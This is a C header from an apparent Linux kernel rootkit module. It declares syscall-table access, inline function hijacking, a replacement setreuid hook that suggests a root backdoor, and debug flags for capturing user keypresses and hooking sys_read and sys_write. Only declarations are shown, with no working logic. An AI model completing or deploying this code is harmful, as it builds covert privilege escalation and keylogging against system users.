#ifndef _R0MOD_GLOBAL_HA
#   define _R0MOD_GLOBAL_HA

#   include <linux/module.h>
#   include <linux/version.h>
#   include <linux/unistd.h>
#   include <linux/slab.h>
#   include <linux/list.h>
#   include <linux/fs.h>
#   if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
#       include <generated/autoconf.h>
#   else
#       include <linux/autoconf.h>
#   endif

// Debugging definitions
#   define __DEBUG__ 1      // General debugging statements
#   define __DEBUG_HOOK__ 1 // Debugging of inline function hooking
#   define __DEBUG_KEY__ 1  // Debugging of user keypresses
#   define __DEBUG_RW__ 1   // Debugging of sys_read and sys_write hooks

// Debugging definitions
#   if __DEBUG__
#       define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
#   else
#       define DEBUG(fmt, ...)
#   endif

#   if __DEBUG_HOOK__
#       define DEBUG_HOOK(fmt, ...) printk(fmt, ##__VA_ARGS__)
#   else
#       define DEBUG_HOOK(fmt, ...)
#   endif

#   if __DEBUG_KEY__
#       define DEBUG_KEY(fmt, ...) printk(fmt, ##__VA_ARGS__)
#   else
#       define DEBUG_KEY(fmt, ...)
#   endif

#   if __DEBUG_RW__
#       define DEBUG_RW(fmt, ...) printk(fmt, ##__VA_ARGS__)
#   else
#       define DEBUG_RW(fmt, ...)
#   endif

extern unsigned long *sct;

#   if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
unsigned long get_symbol(char *name);
#   endif

char *strnstr(const char *haystack, const char *needle, size_t n);
void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
void *memstr(const void *haystack, const char *needle, size_t size);

void hijack_start(void *target, void *new);
void hijack_pause(void *target);
void hijack_resume(void *target);
void hijack_stop(void *target);

extern asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);

asmlinkage int new_setreuid(uid_t ruid, uid_t euid);

#endif
